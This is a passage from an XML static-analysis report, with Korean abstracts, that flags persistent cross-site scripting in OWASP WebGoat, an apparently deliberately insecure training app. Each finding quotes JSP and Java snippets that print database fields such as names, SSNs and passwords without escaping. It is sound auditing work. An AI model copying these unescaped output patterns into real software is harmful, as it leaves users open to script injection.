                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="12926958D26B915D594BA46FD9282F33" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CF6469A271718EA54BE18C5116D1A983" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0372D01C9D748FF3C1B979552F71F557" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6EA9023F96AA54F25BE507D6FD318EE1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="11F1761C672F6E989BCAA93E87F652BC" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 concept1() 메서드가 127 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>127</LineStart>
<Snippet>		    tr.addElement(new TD(rs.getString("userid")));
		    tr.addElement(new TD(rs.getString("password")));
		    tr.addElement(new TD(rs.getString("ssn")));
		    tr.addElement(new TD(rs.getString("salary")));
		    t.addElement(tr);</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>113</LineStart>
<Snippet>		}

		ResultSet rs = statement.executeQuery(arrSQL[0]);
		if (rs.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="15B1D1EFBC916C6E772734E47E238FD9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ABF386B69A6EFB7F886645121EDB2FF1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="60C71BB44837F0DFAEC945CDF2975619" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="921D2A6851AC027C9184B884EB46D429" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8096CD901EED896417CDD69A05240289" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 79 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>79</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;input name="&lt;%=RoleBasedAccessControl.DESCRIPTION%&gt;" type="text" class="lesson_text_db" value="&lt;%=employee.getPersonalDescription()%&gt;" size="58"/&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F1D611AB974A5ABBD4D68D9A8D49ADA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EC517EEA4FB04C660B7AA032C2987BA3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="072B1ED353D7BC9BE32A9F43B7A54B61" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8F03C679090A97AA3C67D2743C8A3104" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3A17359D08361BC888E62AEA39943DCF" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1C6CFDE1683E2973929356D6F9431D64" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6375E9555C79B827A08F1545CAC875A9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="90B0CDDCA48AFB88D62D5C018EDDA8D5" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getFirstName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1703ABD91DCF5A41F203B68D7F499AA1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
